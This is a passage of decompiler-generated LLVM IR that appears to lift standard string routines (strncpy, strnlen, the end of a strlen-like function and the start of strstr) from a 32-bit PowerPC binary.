  %v0_1000df7c = phi i32 [ %v1_1000df7c, %dec_label_pc_1000df7c ], [ %v0_1000df68, %entry ]
  %v1_1000df70 = inttoptr i32 %v0_1000df7c to i8*
  %v2_1000df70 = load i8, i8* %v1_1000df70, align 1
  %v3_1000df74 = icmp eq i8 %v2_1000df70, 0
  br i1 %v3_1000df74, label %dec_label_pc_1000dfbc, label %dec_label_pc_1000df7c

dec_label_pc_1000df7c:                            ; preds = %dec_label_pc_1000df70
  %v1_1000df7c = add i32 %v0_1000df7c, 1
  %v1_1000df80 = urem i32 %v1_1000df7c, 4
  %v3_1000df80 = icmp eq i32 %v1_1000df80, 0
  br i1 %v3_1000df80, label %dec_label_pc_1000df88, label %dec_label_pc_1000df70

dec_label_pc_1000df88:                            ; preds = %dec_label_pc_1000df7c, %entry
  %v0_1000df8c = phi i32 [ %v0_1000df68, %entry ], [ %v1_1000df7c, %dec_label_pc_1000df7c ]
  store i32 -2139062144, i32* @r8, align 4
  br label %dec_label_pc_1000df94

dec_label_pc_1000df94:                            ; preds = %dec_label_pc_1000dff4, %dec_label_pc_1000df94, %dec_label_pc_1000df88
  %v1_1000dfd0 = phi i32 [ %v0_1000df8c, %dec_label_pc_1000df88 ], [ %v1_1000df98, %dec_label_pc_1000df94 ], [ %v1_1000df98, %dec_label_pc_1000dff4 ]
  %v1_1000df94 = inttoptr i32 %v1_1000dfd0 to i32*
  %v2_1000df94 = load i32, i32* %v1_1000df94, align 4
  %v1_1000df98 = add i32 %v1_1000dfd0, 4
  %v1_1000dfa4 = add i32 %v2_1000df94, -16843009
  %v2_1000dfa8 = and i32 %v1_1000dfa4, -2139062144
  %v5_1000dfa8 = icmp eq i32 %v2_1000dfa8, 0
  br i1 %v5_1000dfa8, label %dec_label_pc_1000df94, label %dec_label_pc_1000dfb0

dec_label_pc_1000dfb0:                            ; preds = %dec_label_pc_1000df94
  %v2_1000dfb0 = inttoptr i32 %v1_1000dfd0 to i8*
  %v3_1000dfb0 = load i8, i8* %v2_1000dfb0, align 1
  %v3_1000dfb4 = icmp eq i8 %v3_1000dfb0, 0
  br i1 %v3_1000dfb4, label %dec_label_pc_1000dfbc, label %dec_label_pc_1000dfc4

dec_label_pc_1000dfbc:                            ; preds = %dec_label_pc_1000df70, %dec_label_pc_1000dfb0
  %v1_1000dfbc = phi i32 [ %v1_1000dfd0, %dec_label_pc_1000dfb0 ], [ %v0_1000df7c, %dec_label_pc_1000df70 ]
  %v2_1000dfbc = sub i32 %v1_1000dfbc, %v0_1000df68
  ret i32 %v2_1000dfbc

dec_label_pc_1000dfc4:                            ; preds = %dec_label_pc_1000dfb0
  %v1_1000dfc4 = add i32 %v1_1000dfd0, 1
  %v2_1000dfc4 = inttoptr i32 %v1_1000dfc4 to i8*
  %v3_1000dfc4 = load i8, i8* %v2_1000dfc4, align 1
  %v3_1000dfc8 = icmp eq i8 %v3_1000dfc4, 0
  br i1 %v3_1000dfc8, label %dec_label_pc_1000dfd0, label %dec_label_pc_1000dfdc

dec_label_pc_1000dfd0:                            ; preds = %dec_label_pc_1000dfc4
  %v2_1000dfd0 = sub i32 %v1_1000dfd0, %v0_1000df68
  %v1_1000dfd4 = add i32 %v2_1000dfd0, 1
  ret i32 %v1_1000dfd4

dec_label_pc_1000dfdc:                            ; preds = %dec_label_pc_1000dfc4
  %v1_1000dfdc = add i32 %v1_1000dfd0, 2
  %v2_1000dfdc = inttoptr i32 %v1_1000dfdc to i8*
  %v3_1000dfdc = load i8, i8* %v2_1000dfdc, align 1
  %v3_1000dfe0 = icmp eq i8 %v3_1000dfdc, 0
  br i1 %v3_1000dfe0, label %dec_label_pc_1000dfe8, label %dec_label_pc_1000dff4

dec_label_pc_1000dfe8:                            ; preds = %dec_label_pc_1000dfdc
  %v2_1000dfe8 = sub i32 %v1_1000dfd0, %v0_1000df68
  %v1_1000dfec = add i32 %v2_1000dfe8, 2
  ret i32 %v1_1000dfec

dec_label_pc_1000dff4:                            ; preds = %dec_label_pc_1000dfdc
  %v1_1000dff4 = add i32 %v1_1000dfd0, 3
  %v2_1000dff4 = inttoptr i32 %v1_1000dff4 to i8*
  %v3_1000dff4 = load i8, i8* %v2_1000dff4, align 1
  %v3_1000dff8 = icmp eq i8 %v3_1000dff4, 0
  br i1 %v3_1000dff8, label %dec_label_pc_1000e000, label %dec_label_pc_1000df94

dec_label_pc_1000e000:                            ; preds = %dec_label_pc_1000dff4
  %v2_1000e000 = sub i32 %v1_1000dfd0, %v0_1000df68
  %v1_1000e004 = add i32 %v2_1000e000, 3
  ret i32 %v1_1000e004

; uselistorder directives
  uselistorder i32 %v1_1000df98, { 1, 0 }
  uselistorder i32 %v1_1000dfd0, { 3, 4, 2, 5, 1, 6, 0, 7, 9, 8 }
  uselistorder i32 %v1_1000df7c, { 1, 0, 2 }
  uselistorder i32 %v0_1000df68, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1000dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_1000df70, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000e00c = icmp eq i32 %arg2, 3
  store i1 %v3_1000e00c, i1* %cr7_eq.global-to-local, align 1
  %v1_1000e010 = add i32 %arg1, -1
  store i32 %v1_1000e010, i32* %r11.global-to-local, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_1000e08c, label %dec_label_pc_1000e018

dec_label_pc_1000e018:                            ; preds = %entry
  %v1_1000e018 = udiv i32 %arg2, 4
  store i32 %v1_1000e018, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e020

dec_label_pc_1000e020:                            ; preds = %dec_label_pc_1000e070, %dec_label_pc_1000e018
  %v2_1000e030 = phi i32 [ %v3_1000e068, %dec_label_pc_1000e070 ], [ %v1_1000e010, %dec_label_pc_1000e018 ]
  %v0_1000e020 = load i32, i32* @r4, align 4
  %v1_1000e020 = inttoptr i32 %v0_1000e020 to i8*
  %v2_1000e020 = load i8, i8* %v1_1000e020, align 1
  %v1_1000e024 = add i32 %v0_1000e020, 1
  store i32 %v1_1000e024, i32* %r10.global-to-local, align 4
  %v1_1000e028 = add i32 %v0_1000e020, 2
  store i32 %v1_1000e028, i32* @r8, align 4
  %v3_1000e02c = icmp eq i8 %v2_1000e020, 0
  store i1 %v3_1000e02c, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e030 = add i32 %v2_1000e030, 1
  %v4_1000e030 = inttoptr i32 %v3_1000e030 to i8*
  store i8 %v2_1000e020, i8* %v4_1000e030, align 1
  store i32 %v3_1000e030, i32* %r11.global-to-local, align 4
  %v0_1000e034 = load i32, i32* @r8, align 4
  %v1_1000e034 = add i32 %v0_1000e034, 1
  store i32 %v1_1000e034, i32* %r9.global-to-local, align 4
  %v0_1000e038 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e038, label %dec_label_pc_1000e078, label %dec_label_pc_1000e03c

dec_label_pc_1000e03c:                            ; preds = %dec_label_pc_1000e020
  %v0_1000e03c = load i32, i32* @r4, align 4
  %v1_1000e03c = add i32 %v0_1000e03c, 1
  %v2_1000e03c = inttoptr i32 %v1_1000e03c to i8*
  %v3_1000e03c = load i8, i8* %v2_1000e03c, align 1
  %v1_1000e040 = add i32 %v0_1000e034, 2
  store i32 %v1_1000e040, i32* @r4, align 4
  %v3_1000e044 = icmp eq i8 %v3_1000e03c, 0
  store i1 %v3_1000e044, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e048 = add i32 %v2_1000e030, 2
  %v4_1000e048 = inttoptr i32 %v3_1000e048 to i8*
  store i8 %v3_1000e03c, i8* %v4_1000e048, align 1
  store i32 %v3_1000e048, i32* %r11.global-to-local, align 4
  %v0_1000e04c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e04c, label %dec_label_pc_1000e078, label %dec_label_pc_1000e050

dec_label_pc_1000e050:                            ; preds = %dec_label_pc_1000e03c
  %v0_1000e050 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000e050 = add i32 %v0_1000e050, 1
  %v2_1000e050 = inttoptr i32 %v1_1000e050 to i8*
  %v3_1000e050 = load i8, i8* %v2_1000e050, align 1
  %v3_1000e054 = icmp eq i8 %v3_1000e050, 0
  store i1 %v3_1000e054, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e058 = add i32 %v2_1000e030, 3
  %v4_1000e058 = inttoptr i32 %v3_1000e058 to i8*
  store i8 %v3_1000e050, i8* %v4_1000e058, align 1
  store i32 %v3_1000e058, i32* %r11.global-to-local, align 4
  %v0_1000e05c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e05c, label %dec_label_pc_1000e078, label %dec_label_pc_1000e060

dec_label_pc_1000e060:                            ; preds = %dec_label_pc_1000e050
  %v0_1000e060 = load i32, i32* @r8, align 4
  %v1_1000e060 = add i32 %v0_1000e060, 1
  %v2_1000e060 = inttoptr i32 %v1_1000e060 to i8*
  %v3_1000e060 = load i8, i8* %v2_1000e060, align 1
  %v3_1000e064 = icmp eq i8 %v3_1000e060, 0
  store i1 %v3_1000e064, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e068 = add i32 %v2_1000e030, 4
  %v4_1000e068 = inttoptr i32 %v3_1000e068 to i8*
  store i8 %v3_1000e060, i8* %v4_1000e068, align 1
  store i32 %v3_1000e068, i32* %r11.global-to-local, align 4
  %v0_1000e06c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e06c, label %dec_label_pc_1000e078, label %dec_label_pc_1000e070

dec_label_pc_1000e070:                            ; preds = %dec_label_pc_1000e060
  %v0_1000e070 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e070 = add i32 %v0_1000e070, -1
  store i32 %v1_1000e070, i32* %ctr.global-to-local, align 4
  %v2_1000e070 = icmp eq i32 %v1_1000e070, 0
  br i1 %v2_1000e070, label %dec_label_pc_1000e08c, label %dec_label_pc_1000e020

dec_label_pc_1000e078:                            ; preds = %dec_label_pc_1000e060, %dec_label_pc_1000e050, %dec_label_pc_1000e03c, %dec_label_pc_1000e020
  %v1_1000e078 = phi i32 [ %v3_1000e068, %dec_label_pc_1000e060 ], [ %v3_1000e058, %dec_label_pc_1000e050 ], [ %v3_1000e048, %dec_label_pc_1000e03c ], [ %v3_1000e030, %dec_label_pc_1000e020 ]
  %v2_1000e07811 = sub i32 %arg1, %v1_1000e078
  %v2_1000e07c = add i32 %v2_1000e07811, %arg2
  %v1_1000e080 = add i32 %v2_1000e07c, -1
  store i32 %v1_1000e080, i32* %r9.global-to-local, align 4
  %v4_1000e080 = icmp eq i32 %v1_1000e080, 0
  %v0_1000e084 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000e080, i32 %v0_1000e084)
  %v2_1000e0bc.pre.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e0b4

dec_label_pc_1000e08c:                            ; preds = %dec_label_pc_1000e070, %entry
  %v1_1000e08c = urem i32 %arg2, 4
  store i32 %v1_1000e08c, i32* %r9.global-to-local, align 4
  %v3_1000e08c = icmp eq i32 %v1_1000e08c, 0
  %v0_1000e090 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e08c, i32 %v0_1000e090)
  store i32 %v1_1000e08c, i32* %ctr.global-to-local, align 4
  %v2_1000e0a8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e098

dec_label_pc_1000e098:                            ; preds = %dec_label_pc_1000e0b0.dec_label_pc_1000e098_crit_edge, %dec_label_pc_1000e08c
  %v2_1000e0a8 = phi i32 [ %v3_1000e0a8, %dec_label_pc_1000e0b0.dec_label_pc_1000e098_crit_edge ], [ %v2_1000e0a8.pre, %dec_label_pc_1000e08c ]
  %v0_1000e09c = phi i32 [ %v0_1000e09c.pre, %dec_label_pc_1000e0b0.dec_label_pc_1000e098_crit_edge ], [ %v1_1000e08c, %dec_label_pc_1000e08c ]
  %v0_1000e098 = load i32, i32* @r4, align 4
  %v1_1000e098 = inttoptr i32 %v0_1000e098 to i8*
  %v2_1000e098 = load i8, i8* %v1_1000e098, align 1
  %v1_1000e09c = add i32 %v0_1000e09c, -1
  store i32 %v1_1000e09c, i32* %r9.global-to-local, align 4
  %v1_1000e0a0 = add i32 %v0_1000e098, 1
  store i32 %v1_1000e0a0, i32* @r4, align 4
  %v3_1000e0a4 = icmp eq i8 %v2_1000e098, 0
  store i1 %v3_1000e0a4, i1* %cr7_eq.global-to-local, align 1
  %v3_1000e0a8 = add i32 %v2_1000e0a8, 1
  %v4_1000e0a8 = inttoptr i32 %v3_1000e0a8 to i8*
  store i8 %v2_1000e098, i8* %v4_1000e0a8, align 1
  store i32 %v3_1000e0a8, i32* %r11.global-to-local, align 4
  %v0_1000e0ac = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e0ac = add i32 %v0_1000e0ac, -1
  store i32 %v1_1000e0ac, i32* %ctr.global-to-local, align 4
  %v2_1000e0ac = icmp eq i32 %v1_1000e0ac, 0
  br i1 %v2_1000e0ac, label %dec_label_pc_1000e0c4, label %dec_label_pc_1000e0b0

dec_label_pc_1000e0b0:                            ; preds = %dec_label_pc_1000e098
  %v0_1000e0b0 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000e0b0, label %dec_label_pc_1000e0b4, label %dec_label_pc_1000e0b0.dec_label_pc_1000e098_crit_edge

dec_label_pc_1000e0b0.dec_label_pc_1000e098_crit_edge: ; preds = %dec_label_pc_1000e0b0
  %v0_1000e09c.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000e098

dec_label_pc_1000e0b4:                            ; preds = %dec_label_pc_1000e0b0, %dec_label_pc_1000e078
  %v2_1000e0bc.pre = phi i32 [ %v2_1000e0bc.pre.pre, %dec_label_pc_1000e078 ], [ %v3_1000e0a8, %dec_label_pc_1000e0b0 ]
  %v0_1000e0b4 = load i32, i32* %r9.global-to-local, align 4
  store i32 %v0_1000e0b4, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000e0b8

dec_label_pc_1000e0b8:                            ; preds = %dec_label_pc_1000e0b8, %dec_label_pc_1000e0b4
  %v2_1000e0bc = phi i32 [ %v3_1000e0bc, %dec_label_pc_1000e0b8 ], [ %v2_1000e0bc.pre, %dec_label_pc_1000e0b4 ]
  %v3_1000e0bc = add i32 %v2_1000e0bc, 1
  %v4_1000e0bc = inttoptr i32 %v3_1000e0bc to i8*
  store i8 0, i8* %v4_1000e0bc, align 1
  store i32 %v3_1000e0bc, i32* %r11.global-to-local, align 4
  %v0_1000e0c0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000e0c0 = add i32 %v0_1000e0c0, -1
  store i32 %v1_1000e0c0, i32* %ctr.global-to-local, align 4
  %v2_1000e0c0 = icmp eq i32 %v1_1000e0c0, 0
  br i1 %v2_1000e0c0, label %dec_label_pc_1000e0c4, label %dec_label_pc_1000e0b8

dec_label_pc_1000e0c4:                            ; preds = %dec_label_pc_1000e098, %dec_label_pc_1000e0b8
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_1000e0c0, { 1, 0 }
  uselistorder i32 %v3_1000e0bc, { 1, 2, 0 }
  uselistorder i32 %v1_1000e0ac, { 1, 0 }
  uselistorder i32 %v3_1000e0a8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_1000e08c, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000e070, { 1, 0 }
  uselistorder i32 %v3_1000e068, { 0, 2, 3, 1 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4, 5 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 7, 5, 2, 3, 4, 6, 8 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e0c4, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000e0c8 = load i32, i32* @r4, align 4
  %v3_1000e0c8 = icmp eq i32 %v0_1000e0c8, 0
  %v0_1000e0d4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e0c8, i32 %v0_1000e0d4)
  %v1_1000e0e4 = load i32, i32* @r4, align 4
  %v2_1000e0e4 = add i32 %v1_1000e0e4, %tmp
  %v3_1000e0e8 = icmp ugt i32 %v2_1000e0e4, %tmp
  %v4_1000e0e8 = icmp eq i32 %v1_1000e0e4, 0
  %v2_1000e0ec = or i1 %v4_1000e0e8, %v3_1000e0e8
  br i1 %v2_1000e0ec, label %dec_label_pc_1000e0f4, label %dec_label_pc_1000e0f0

dec_label_pc_1000e0dc:                            ; preds = %dec_label_pc_1000e15c
  br label %dec_label_pc_1000e1a0

dec_label_pc_1000e0f0:                            ; preds = %entry
  br label %dec_label_pc_1000e0f4

dec_label_pc_1000e0f4:                            ; preds = %entry, %dec_label_pc_1000e0f0
  %v0_1000e1a4 = phi i32 [ %v2_1000e0e4, %entry ], [ -1, %dec_label_pc_1000e0f0 ]
  %v1_1000e1246 = urem i32 %tmp, 4
  %v3_1000e1248 = icmp eq i32 %v1_1000e1246, 0
  br i1 %v3_1000e1248, label %dec_label_pc_1000e12c, label %dec_label_pc_1000e0fc

dec_label_pc_1000e0fc:                            ; preds = %dec_label_pc_1000e0f4, %dec_label_pc_1000e120
  %v0_1000e114 = phi i32 [ %v1_1000e120, %dec_label_pc_1000e120 ], [ %tmp, %dec_label_pc_1000e0f4 ]
  %v1_1000e0fc = inttoptr i32 %v0_1000e114 to i8*
  %v2_1000e0fc = load i8, i8* %v1_1000e0fc, align 1
  %v3_1000e100 = icmp eq i8 %v2_1000e0fc, 0
  br i1 %v3_1000e100, label %dec_label_pc_1000e108, label %dec_label_pc_1000e120

dec_label_pc_1000e108:                            ; preds = %dec_label_pc_1000e0fc
  %v3_1000e108 = icmp ugt i32 %v0_1000e1a4, %v0_1000e114
  %v0_1000e114.v0_1000e1a4 = select i1 %v3_1000e108, i32 %v0_1000e114, i32 %v0_1000e1a4
  %v2_1000e118 = sub i32 %v0_1000e114.v0_1000e1a4, %tmp
  ret i32 %v2_1000e118

dec_label_pc_1000e120:                            ; preds = %dec_label_pc_1000e0fc
  %v1_1000e120 = add i32 %v0_1000e114, 1
  %v1_1000e124 = urem i32 %v1_1000e120, 4
  %v3_1000e124 = icmp eq i32 %v1_1000e124, 0
  br i1 %v3_1000e124, label %dec_label_pc_1000e12c, label %dec_label_pc_1000e0fc

dec_label_pc_1000e12c:                            ; preds = %dec_label_pc_1000e120, %dec_label_pc_1000e0f4
  %v0_1000e130 = phi i32 [ %tmp, %dec_label_pc_1000e0f4 ], [ %v1_1000e120, %dec_label_pc_1000e120 ]
  store i32 -2139062144, i32* @r7, align 4
  %v2_1000e1983 = icmp ult i32 %v0_1000e130, %v0_1000e1a4
  br i1 %v2_1000e1983, label %dec_label_pc_1000e13c, label %dec_label_pc_1000e1a0

dec_label_pc_1000e13c:                            ; preds = %dec_label_pc_1000e12c, %dec_label_pc_1000e194
  %v0_1000e0dc = phi i32 [ %v1_1000e140, %dec_label_pc_1000e194 ], [ %v0_1000e130, %dec_label_pc_1000e12c ]
  %v1_1000e13c = inttoptr i32 %v0_1000e0dc to i32*
  %v2_1000e13c = load i32, i32* %v1_1000e13c, align 4
  %v1_1000e140 = add i32 %v0_1000e0dc, 4
  store i32 %v0_1000e0dc, i32* @r8, align 4
  %v1_1000e14c = add i32 %v2_1000e13c, -16843009
  %v2_1000e150 = and i32 %v1_1000e14c, -2139062144
  %v5_1000e150 = icmp eq i32 %v2_1000e150, 0
  %v1_1000e154 = add i32 %v0_1000e0dc, 1
  br i1 %v5_1000e150, label %dec_label_pc_1000e194, label %dec_label_pc_1000e15c

dec_label_pc_1000e15c:                            ; preds = %dec_label_pc_1000e13c
  %v2_1000e15c = inttoptr i32 %v0_1000e0dc to i8*
  %v3_1000e15c = load i8, i8* %v2_1000e15c, align 1
  %v3_1000e160 = icmp eq i8 %v3_1000e15c, 0
  br i1 %v3_1000e160, label %dec_label_pc_1000e0dc, label %dec_label_pc_1000e168

dec_label_pc_1000e168:                            ; preds = %dec_label_pc_1000e15c
  %v2_1000e168 = inttoptr i32 %v1_1000e154 to i8*
  %v3_1000e168 = load i8, i8* %v2_1000e168, align 1
  %v3_1000e16c = icmp eq i8 %v3_1000e168, 0
  br i1 %v3_1000e16c, label %dec_label_pc_1000e1a0, label %dec_label_pc_1000e174

dec_label_pc_1000e174:                            ; preds = %dec_label_pc_1000e168
  %v1_1000e174 = add i32 %v0_1000e0dc, 2
  %v2_1000e174 = inttoptr i32 %v1_1000e174 to i8*
  %v3_1000e174 = load i8, i8* %v2_1000e174, align 1
  %v3_1000e17c = icmp eq i8 %v3_1000e174, 0
  br i1 %v3_1000e17c, label %dec_label_pc_1000e1a0, label %dec_label_pc_1000e184

dec_label_pc_1000e184:                            ; preds = %dec_label_pc_1000e174
  %v1_1000e184 = add i32 %v0_1000e0dc, 3
  %v2_1000e184 = inttoptr i32 %v1_1000e184 to i8*
  %v3_1000e184 = load i8, i8* %v2_1000e184, align 1
  %v3_1000e18c = icmp eq i8 %v3_1000e184, 0
  br i1 %v3_1000e18c, label %dec_label_pc_1000e1a0, label %dec_label_pc_1000e194

dec_label_pc_1000e194:                            ; preds = %dec_label_pc_1000e184, %dec_label_pc_1000e13c
  %v2_1000e198 = icmp ult i32 %v1_1000e140, %v0_1000e1a4
  br i1 %v2_1000e198, label %dec_label_pc_1000e13c, label %dec_label_pc_1000e1a0

dec_label_pc_1000e1a0:                            ; preds = %dec_label_pc_1000e194, %dec_label_pc_1000e168, %dec_label_pc_1000e174, %dec_label_pc_1000e184, %dec_label_pc_1000e12c, %dec_label_pc_1000e0dc
  %v0_1000e1ac = phi i32 [ %v0_1000e0dc, %dec_label_pc_1000e0dc ], [ %v0_1000e130, %dec_label_pc_1000e12c ], [ %v1_1000e184, %dec_label_pc_1000e184 ], [ %v1_1000e174, %dec_label_pc_1000e174 ], [ %v1_1000e154, %dec_label_pc_1000e168 ], [ %v0_1000e1a4, %dec_label_pc_1000e194 ]
  %v3_1000e1a0 = icmp ugt i32 %v0_1000e1a4, %v0_1000e1ac
  %v0_1000e1ac.v0_1000e1a4 = select i1 %v3_1000e1a0, i32 %v0_1000e1ac, i32 %v0_1000e1a4
  %v2_1000e1b0 = sub i32 %v0_1000e1ac.v0_1000e1a4, %tmp
  ret i32 %v2_1000e1b0

; uselistorder directives
  uselistorder i32 %v1_1000e140, { 1, 0 }
  uselistorder i32 %v0_1000e0dc, { 0, 1, 2, 4, 3, 7, 6, 5 }
  uselistorder i32 %v0_1000e130, { 1, 0, 2 }
  uselistorder i32 %v1_1000e120, { 1, 0, 2 }
  uselistorder i32 %v0_1000e114, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1000e1a4, { 1, 4, 0, 3, 5, 2, 6 }
  uselistorder i32 %v1_1000e0e4, { 1, 0 }
  uselistorder i32 %tmp, { 2, 3, 1, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000e1a0, { 0, 3, 2, 1, 4, 5 }
  uselistorder label %dec_label_pc_1000e13c, { 1, 0 }
  uselistorder label %dec_label_pc_1000e0fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e0f4, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v3_1000e1b8 = load i8, i8* %arg2, align 1
  %v4_1000e1b8 = zext i8 %v3_1000e1b8 to i32
  store i32 %v4_1000e1b8, i32* %r6.global-to-local, align 4
  %v3_1000e1bc = icmp eq i8 %v3_1000e1b8, 0
  %v0_1000e1c0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e1bc, i32 %v0_1000e1c0)
  %v1_1000e1c4 = add i32 %arg1, -1
  store i32 %v1_1000e1c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e1c8

dec_label_pc_1000e1c8:                            ; preds = %dec_label_pc_1000e1d8, %entry
  %v0_1000e1c8 = phi i32 [ %v1_1000e1c8, %dec_label_pc_1000e1d8 ], [ %v1_1000e1c4, %entry ]
  %v1_1000e1c8 = add i32 %v0_1000e1c8, 1
  %v2_1000e1c8 = inttoptr i32 %v1_1000e1c8 to i8*
  %v3_1000e1c8 = load i8, i8* %v2_1000e1c8, align 1
  store i32 %v1_1000e1c8, i32* %r3.global-to-local, align 4
  %v3_1000e1cc = icmp eq i8 %v3_1000e1c8, 0
  br i1 %v3_1000e1cc, label %dec_label_pc_1000e2a4, label %dec_label_pc_1000e1d8

dec_label_pc_1000e1d8:                            ; preds = %dec_label_pc_1000e1c8
  %v4_1000e1d0 = icmp eq i8 %v3_1000e1c8, %v3_1000e1b8
  br i1 %v4_1000e1d0, label %dec_label_pc_1000e1dc, label %dec_label_pc_1000e1c8

dec_label_pc_1000e1dc:                            ; preds = %dec_label_pc_1000e1d8
  %v2_1000e1dc = add i32 %tmp, 1
  %v3_1000e1dc = inttoptr i32 %v2_1000e1dc to i8*
  %v4_1000e1dc = load i8, i8* %v3_1000e1dc, align 1
  %v5_1000e1dc = zext i8 %v4_1000e1dc to i32
  store i32 %v5_1000e1dc, i32* %r5.global-to-local, align 4
  store i32 %v2_1000e1dc, i32* %r4.global-to-local, align 4
  %v3_1000e1e4 = icmp eq i8 %v4_1000e1dc, 0
  %v0_1000e1e8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000e1e4, i32 %v0_1000e1e8)
  %v0_1000e1ec.sink.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000e230

dec_label_pc_1000e1f8:                            ; preds = %dec_label_pc_1000e298
  %v3_1000e1f8 = load i8, i8* %storemerge4.in.in, align 1
  %v4_1000e1f8 = zext i8 %v3_1000e1f8 to i32
  store i32 %v1_1000e1ec, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000e220.preheader

dec_label_pc_1000e220.preheader:                  ; preds = %dec_label_pc_1000e1f8, %dec_label_pc_1000e230
  %v0_1000e22017 = phi i32 [ %v4_1000e1f8, %dec_label_pc_1000e1f8 ], [ %storemerge4, %dec_label_pc_1000e230 ]
  %v1_1000e220.pre = load i32, i32* %r6.global-to-local, align 4
  %v4_1000e22025 = icmp eq i32 %v0_1000e22017, %v1_1000e220.pre
  %v3_1000e22427 = icmp eq i32 %v0_1000e22017, 0
  br i1 %v4_1000e22025, label %dec_label_pc_1000e230, label %dec_label_pc_1000e204

dec_label_pc_1000e204:                            ; preds = %dec_label_pc_1000e220.preheader, %dec_label_pc_1000e21c
  %v3_1000e22429 = phi i1 [ %v3_1000e224, %dec_label_pc_1000e21c ], [ %v3_1000e22427, %dec_label_pc_1000e220.preheader ]
  %v0_1000e20828 = phi i32 [ %v1_1000e21c, %dec_label_pc_1000e21c ], [ %v1_1000e1ec, %dec_label_pc_1000e220.preheader ]
  br i1 %v3_1000e22429, label %dec_label_pc_1000e2a4, label %dec_label_pc_1000e208

dec_label_pc_1000e208:                            ; preds = %dec_label_pc_1000e204
  %v1_1000e208 = add i32 %v0_1000e20828, 1
  %v2_1000e208 = inttoptr i32 %v1_1000e208 to i8*
  %v3_1000e208 = load i8, i8* %v2_1000e208, align 1
  %v4_1000e208 = zext i8 %v3_1000e208 to i32
  store i32 %v1_1000e208, i32* %r11.global-to-local, align 4
  %v4_1000e20c = icmp eq i32 %v4_1000e208, %v1_1000e220.pre
  br i1 %v4_1000e20c, label %dec_label_pc_1000e230, label %dec_label_pc_1000e218

dec_label_pc_1000e218:                            ; preds = %dec_label_pc_1000e208
  %v3_1000e210 = icmp eq i8 %v3_1000e208, 0
  br i1 %v3_1000e210, label %dec_label_pc_1000e2a4, label %dec_label_pc_1000e21c

dec_label_pc_1000e21c:                            ; preds = %dec_label_pc_1000e218
  %v1_1000e21c = add i32 %v0_1000e20828, 2
  %v2_1000e21c = inttoptr i32 %v1_1000e21c to i8*
  %v3_1000e21c = load i8, i8* %v2_1000e21c, align 1
  %v4_1000e21c = zext i8 %v3_1000e21c to i32
  store i32 %v1_1000e21c, i32* %r11.global-to-local, align 4
  %v4_1000e220 = icmp eq i32 %v4_1000e21c, %v1_1000e220.pre
  %v3_1000e224 = icmp eq i8 %v3_1000e21c, 0
  br i1 %v4_1000e220, label %dec_label_pc_1000e230, label %dec_label_pc_1000e204

dec_label_pc_1000e230:                            ; preds = %dec_label_pc_1000e220.preheader, %dec_label_pc_1000e21c, %dec_label_pc_1000e208, %dec_label_pc_1000e1dc
